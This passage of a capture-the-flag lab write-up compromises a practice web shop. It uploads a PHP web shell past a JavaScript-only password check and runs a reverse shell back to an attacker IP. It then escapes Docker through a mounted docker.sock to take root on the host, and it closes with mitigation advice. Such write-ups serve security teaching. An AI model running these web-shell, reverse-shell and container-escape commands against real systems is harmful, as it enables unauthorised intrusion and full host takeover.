$ curl -s http://review.thm/dashboard.php -b 'PHPSESSID=pkigmf7h0l5fd8hr2f118mlc7c' -F 'feature=finance.php'
[…]
<div id="finance-password-box" style="text-align: center;">
    <h3>🔒 Enter Password to Access Finance Panel</h3>
    <input type="password" id="finance-accessPassword" placeholder="Enter password" style="
        padding: 12px;
        width: 300px;
        border: 1px solid #ccc;
        border-radius: 6px;
        margin-bottom: 20px;
        font-size: 16px;
    " />
    <br>
    <button onclick="validateFinancePassword()" style="
        padding: 10px 20px;
        background: #007bff;
        color: white;
        border: none;
        font-size: 16px;
        border-radius: 6px;
        cursor: pointer;
    ">Unlock</button>
    <div id="finance-error-msg" style="color: red; margin-top: 10px;"></div>
</div>
[…]
            <h3>📤 Upload Latest Investor Details</h3>
            <form method="post" enctype="multipart/form-data">
                <input type="file" name="investor_file" required style="margin-bottom: 10px;"><br>
                <button type="submit" style="
                    padding: 8px 16px;
                    background: #28a745;
                    color: white;
                    border: none;
                    cursor: pointer;
                    border-radius: 4px;
                ">Upload</button>
            </form>
[…]
```

Since the back-end language is PHP, let's create a simple web-shell to see if we can upload a malicious file:

```
$ vim webshell.php
$ cat webshell.php
<?php system($_GET["cmd"]); ?>
```

The password overlay is implemented in JavaScript.
We can bypass it with `curl` to upload our web-shell:

```
$ curl -vL http://review.thm/dashboard.php -b 'PHPSESSID=pkigmf7h0l5fd8hr2f118mlc7c' -F 'feature=finance.php' -F 'investor_file=@webshell.php' | html2text
Review Shop
    * Home
    * Chat
    * View Feedback
    * Settings
    * Contact Us
    * <ADMIN-FLAG>
Hi, mod Logout
***** Welcome, mod! *****
You are logged in as admin.
Logout View Feedback Open Chat Settings
[One of: -- Select Feature --/Lottery Feature]
**** ð Enter Password to Access Finance Panel ****
[********************]
Unlock
***** Investor Finance Table *****
ID Investor Name    Invested Amount Equity (%) Contact
1  Alice Ventures   $100,000        20%        alice@finance.thm
2  Bob Capital      $250,000        35%        bob@finance.thm
3  Charlie Group    $80,000         15%        charlie@finance.thm
4  Delta Fund       $300,000        40%        delta@finance.thm
5  Echo Investments $150,000        25%        echo@finance.thm
**** ð¤ Upload Latest Investor Details ****
0px;">
Upload
â File uploaded successfully in uploads folder!
File Name: webshell.php
Path: uploads/webshell.php
Size: 0.03 KB
Type: application/octet-stream
```

Website's response shows that our shell was uploaded to `uploads/website.php`.
If it's the same directory that `gobuster` enumeration revealed, then we should be able to access it.
Testing confirms that we can reach our shell and have RCE on the server:

```
$ curl -s http://review.thm/dashboard.php -b 'PHPSESSID=pkigmf7h0l5fd8hr2f118mlc7c' -F 'feature=uploads/webshell.php?cmd=id' | html2text
Review Shop
    * Home
    * Chat
    * View Feedback
    * Settings
    * Contact Us
    * <ADMIN-FLAG>
Hi, mod Logout
***** Welcome, mod! *****
You are logged in as admin.
Logout View Feedback Open Chat Settings
[One of: -- Select Feature --/Lottery Feature]
uid=0(root) gid=0(root) groups=0(root)
```

Before attempting to get a reverse shell on the server, we enumerate the OS:

```
$ curl -s http://review.thm/dashboard.php -b 'PHPSESSID=pkigmf7h0l5fd8hr2f118mlc7c' -F 'feature=uploads/webshell.php?cmd=uname%20-a' | html2text
Review Shop
    * Home
    * Chat
    * View Feedback
    * Settings
    * Contact Us
    * <ADMIN-FLAG>
Hi, mod Logout
***** Welcome, mod! *****
You are logged in as admin.
Logout View Feedback Open Chat Settings
[One of: -- Select Feature --/Lottery Feature]
Linux 4f18a45cca05 5.15.0-139-generic #149~20.04.1-Ubuntu SMP Wed Apr 16 08:29:
56 UTC 2025 x86_64 GNU/Linux
```

This is in case we need to use a reverse shell payload.
In the past, we've had more luck with payloads utilizing named pipes on Ubuntu servers.

Before sending our own payloads, we try pentestmonkey's PHP reverse shell.
Modify the shell so that it connects back to our machine:

```
$ sed -i 's/127.0.0.1/<ATTACKER-IP>/;s/1234/4444/' revshell.php
```

Upload the reverse shell:

```
$ curl -s http://review.thm/dashboard.php -b 'PHPSESSID=pkigmf7h0l5fd8hr2f118mlc7c' -F 'feature=finance.php' -F 'investor_file=@revshell.php' | html2text
Review Shop
    * Home
    * Chat
    * View Feedback
    * Settings
    * Contact Us
    * <ADMIN-FLAG>
Hi, mod Logout
***** Welcome, mod! *****
You are logged in as admin.
Logout View Feedback Open Chat Settings
[One of: -- Select Feature --/Lottery Feature]
**** ð Enter Password to Access Finance Panel ****
[********************]
Unlock
***** Investor Finance Table *****
ID Investor Name    Invested Amount Equity (%) Contact
1  Alice Ventures   $100,000        20%        alice@finance.thm
2  Bob Capital      $250,000        35%        bob@finance.thm
3  Charlie Group    $80,000         15%        charlie@finance.thm
4  Delta Fund       $300,000        40%        delta@finance.thm
5  Echo Investments $150,000        25%        echo@finance.thm
**** ð¤ Upload Latest Investor Details ****
0px;">
Upload
â File uploaded successfully in uploads folder!
File Name: revshell.php
Path: uploads/revshell.php
Size: 5.37 KB
Type: application/octet-stream
```
Start a listener on the attacking machine:

```
$ nc -lvnp 4444
listening on [any] 4444 ...
```

Execute the shell via `curl`:

```
$ curl -s http://review.thm/dashboard.php -b 'PHPSESSID=pkigmf7h0l5fd8hr2f118mlc7c' -F 'feature=uploads/revshell.php' | html2text
```

Catch a root shell:

```
$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [<ATTACKER-IP>] from (UNKNOWN) [<TARGET-IP>] 36562
Linux 4f18a45cca05 5.15.0-139-generic #149~20.04.1-Ubuntu SMP Wed Apr 16 08:29:56 UTC 2025 x86_64 GNU/Linux
sh: 1: w: not found
uid=0(root) gid=0(root) groups=0(root)
/bin/sh: 0: can't access tty; job control turned off
```

We check if `python3` is installed and use it to stabilize the shell:

```
# which python3
/usr/bin/python3
# python3 -c 'import pty;pty.spawn("/bin/bash")'
root@4f18a45cca05:/# ^Z
zsh: suspended  nc -lvnp 4444

$ stty -a
speed 38400 baud; rows 56; columns 135; line = 0;
intr = ^C; quit = ^\; erase = ^?; kill = ^U; eof = ^D; eol = <undef>; eol2 = <undef>; swtch = <undef>; start = ^Q; stop = ^S;
susp = ^Z; rprnt = ^R; werase = ^W; lnext = ^V; discard = ^O; min = 1; time = 0;
-parenb -parodd -cmspar cs8 -hupcl -cstopb cread -clocal -crtscts
-ignbrk -brkint -ignpar -parmrk -inpck -istrip -inlcr -igncr icrnl ixon -ixoff -iuclc -ixany -imaxbel iutf8
opost -olcuc -ocrnl onlcr -onocr -onlret -ofill -ofdel nl0 cr0 tab0 bs0 vt0 ff0
isig icanon iexten echo echoe echok -echonl -noflsh -xcase -tostop -echoprt echoctl echoke -flusho -extproc

$ stty raw -echo; fg
[1]  + continued  nc -lvnp 4444

root@4f18a45cca05:/# export SHELL=/bin/bash
root@4f18a45cca05:/# export TERM=xterm
root@4f18a45cca05:/# stty rows 56 columns 135
root@4f18a45cca05:/# reset
```

Enumerating users with a logon shell shows that `root` is the only user.

```
root@4f18a45cca05:/# cat /etc/passwd | grep 'sh$'
root:x:0:0:root:/root:/bin/bash
```

Based on past experience, these findings suggest that we may be inside a docker container.
Finding a `.dockerenv` file in the filesystem root confirms this:

```
root@4f18a45cca05:/# ls -lah
total 60K
drwxr-xr-x   1 root root 4.0K Jun  4  2025 .
drwxr-xr-x   1 root root 4.0K Jun  4  2025 ..
-rwxr-xr-x   1 root root    0 Jun  4  2025 .dockerenv
lrwxrwxrwx   1 root root    7 May 20  2025 bin -> usr/bin
drwxr-xr-x   2 root root 4.0K May  9  2025 boot
drwxr-xr-x   5 root root  340 Jan 17 04:00 dev
drwxr-xr-x   1 root root 4.0K Jun  4  2025 etc
drwxr-xr-x   2 root root 4.0K May  9  2025 home
lrwxrwxrwx   1 root root    7 May 20  2025 lib -> usr/lib
lrwxrwxrwx   1 root root    9 May 20  2025 lib64 -> usr/lib64
drwxr-xr-x   2 root root 4.0K May 20  2025 media
drwxr-xr-x   2 root root 4.0K May 20  2025 mnt
drwxr-xr-x   2 root root 4.0K May 20  2025 opt
dr-xr-xr-x 198 root root    0 Jan 17 04:00 proc
drwx------   1 root root 4.0K Jun  4  2025 root
drwxr-xr-x   1 root root 4.0K Jun  4  2025 run
lrwxrwxrwx   1 root root    8 May 20  2025 sbin -> usr/sbin
drwxr-xr-x   2 root root 4.0K May 20  2025 srv
dr-xr-xr-x  13 root root    0 Jan 17 04:00 sys
drwxrwxrwt   1 root root 4.0K Jan 17 06:45 tmp
drwxr-xr-x   1 root root 4.0K May 20  2025 usr
drwxr-xr-x   1 root root 4.0K May 21  2025 var
```

# Privilege escalation: container escape

"[Docker](https://hacktricks.wiki/en/network-services-pentesting/2375-pentesting-docker.html) is a platform for building, distributing, and running applications in containers."
Containers isolate the application from the host OS and its filesystem to an extent.
Unlike virtual machines, containers share the host OS's kernel.
The Docker socket, `docker.sock`, is a Unix socket that the docker daemon listens to and the Docker CLI client uses for executing [commands](https://stackoverflow.com/questions/35110146/what-is-the-purpose-of-the-file-docker-sock).

Mounting `docker.sock` inside the container exposes the docker daemon running on the host to the container.
This allows a user inside the container to run docker commands on the host from inside the container.
Since Docker launches containers as `root` by default in order for them to have access to Linux cgroups and namespaces, this means that a user inside the container can run docker commands on the host that would require root privileges or membership in the `docker` group on the host.

A common [mounted docker socket escape](https://blog.1nf1n1ty.team/hacktricks/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation) involves creating a new container, mounting the host filesystem inside it and accessing the host filesystem inside this new container with root privileges.

So one of the first things to do inside a docker container is to check if the socket has been mounted inside the container:

```
root@4f18a45cca05:/# find / -type f -name docker.sock -ls 2>/dev/null
      618      0 srw-rw----   1 root     121             0 Jan 17 03:59 /run/docker.sock
```

Next, confirm that `docker` is installed inside the container so we can run Docker commands:

```
root@4f18a45cca05:/# which docker
/usr/bin/docker
```

If it wasn't installed, we'd have to transfer it to the target.

Next, we check which images are available for creating a new container:

```
root@4f18a45cca05:/# docker image ls
REPOSITORY      TAG       IMAGE ID       CREATED         SIZE
phpvulnerable   latest    d0bf58293d3b   7 months ago    926MB
php             8.1-cli   0ead645a9bc2   10 months ago   527MB
```

Either one would work.
We choose the second image for our container, mount the root filesystem in the `/mnt` directory inside the container and start an interactive `bash` pseudoterminal in the container:

```
root@4f18a45cca05:/# docker run -v /:/mnt --rm -it php:8.1-cli bash
```

Once inside, find and get the root flag:

```
root@619cd2d66db6:/# find / -type f -name flag.txt -ls 2>/dev/null
  2562517      4 -rw-r--r--   1 root     root           20 Jun  4  2025 /mnt/root/flag.txt
root@619cd2d66db6:/# cat /mnt/root/flag.txt
<ROOT-FLAG>
```

Checking the contents of `/root` we find the `.ssh/` directory:

```
root@619cd2d66db6:/# ls -lah /mnt/root
total 68K
drwxr-x--- 12 root root 4.0K Jun  4  2025  .
drwxr-xr-x 19 root root 4.0K Jan 17 03:59  ..
lrwxrwxrwx  1 root root    9 Feb  4  2024  .bash_history -> /dev/null
-rw-r--r--  1 root root 3.1K Dec  5  2019  .bashrc
drwxr-xr-x  3 root root 4.0K Feb  2  2024  .cache
drwx------  3 root root 4.0K Feb  2  2024  .config
drwxr-xr-x  3 root root 4.0K Nov 10  2021  .local
-rw-------  1 root root  131 Jun  4  2025  .mysql_history
-rw-r--r--  1 root root  161 Dec  5  2019  .profile
-rw-r--r--  1 root root   66 Feb  1  2024  .selected_editor
drwx------  2 root root 4.0K Nov 10  2021  .ssh
drwxr-xr-x  2 root root 4.0K Feb  2  2024  bin
-rw-r--r--  1 root root   20 Jun  4  2025  flag.txt
drwxr-xr-x  3 root root 4.0K Feb  2  2024  lib
drwx------  7 root root 4.0K Feb  2  2024  root
drwx------  4 root root 4.0K Feb  2  2024  share
drwx------  4 root root 4.0K Feb  2  2024  snap
drwx------  3 root root 4.0K Feb  2  2024 '~'
```

For persistence, we could generate ssh keys and insert our public key into `/root/.ssh/authorized_keys` to get it onto the host filesystem.
However, this CTF has taken long enough.

# Summary

Some [steps](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) for mitigating the blind XSS vulnerability:

- Enable `HttpOnly` flag for cookies.
- Validate and escape or sanitize all user input.
- Use output encoding to display user input as text instead of code that the browser can execute (frameworks like react have built-in encoding functions; there are also several output encoding libraries).
- Use a Content Security Policy (CSP) that allowlists the kind of content that can be loaded.
- Utilize a Web Application Firewall (WAF) to looks for known attack strings and blocks them.

Although the target uses CSRF tokens, they are simply MD5 hashes of the logged in user's username.
A CSRF token should be unique, secret and [unpredictable](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html).
Instead of am MD5 hash of a known value, the token should consist of a large random value generated by a secure method.

To protect against file upload [vulnerabilities](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html):

- Only allow extensions that are safe or critical for business operations.
- Validate the file type instead of relying on the Content-Type header.
- Change the filename before storing the file on the server.
- Store files on a different server or outside the webroot.
- Run uploaded files through an antivirus or sandbox.
- Restrict file uploading only to authorized users.
- Set limits to file size and to filename length.

Finally, to prevent docker escapes:

- Avoid mounting `docker.sock` inside containers, if possible.
- Run containers as non-root users.
- Whenever possible, use read-only mounts (enabled by the `ro` flag).

